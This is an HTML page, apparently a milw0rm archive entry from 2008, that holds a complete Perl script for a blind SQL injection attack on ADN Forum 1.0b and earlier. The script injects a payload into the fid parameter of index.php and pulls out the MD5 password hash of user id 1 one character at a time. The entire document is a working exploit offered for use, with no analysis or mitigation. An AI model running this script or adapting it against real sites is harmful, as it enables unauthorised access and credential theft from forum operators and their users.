<html><head><title>ADN Forum <= 1.0b Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
# --------------------------------------------------
# ADN Forum &lt;= 1.0b Blind SQL Injection Exploit
# Discovered By: StAkeR - StAkeR[at]hotmail[dot]it
# Discovered On: 01/10/2008
# Download: http://sourceforge.net/projects/adnforum/
# --------------------------------------------------
# Usage: perl exploit.pl http://localhost
# --------------------------------------------------

use strict;
use warnings;
use LWP::UserAgent;
use URI::Escape;

my ($request,$send,$ord,$hash,$uid) = (undef,undef,undef,undef,1);

my $host = shift @ARGV or die &quot;[?] Usage: perl $0 http://[host]\n&quot;;
my @chars = (48..57, 97..102); 
my $http = new LWP::UserAgent;

for(0..32)
{
  foreach $ord(@chars) 
  {
    $send = &quot;' or ascii(substring((select password from adn_usuarios where id=1),$uid,1))=$ord#&quot;;
    $send = uri_escape($send);
    
    $request = $http-&gt;get($host.&quot;/index.php?fid=&quot;.$send);
    
    if($request-&gt;is_success and $request-&gt;content =~ /hace clic en el boton de abajo/i)
    {
      $hash .= chr($ord); 
      $uid++;
    }
  }
}

if(defined $hash)
{
  print &quot;[+] MD5: $hash\n&quot;;
  exit;
}
else
{
  print &quot;[?] Exploit Failed!\n&quot;;
  exit;
}

# milw0rm.com [2008-10-01]</pre></html>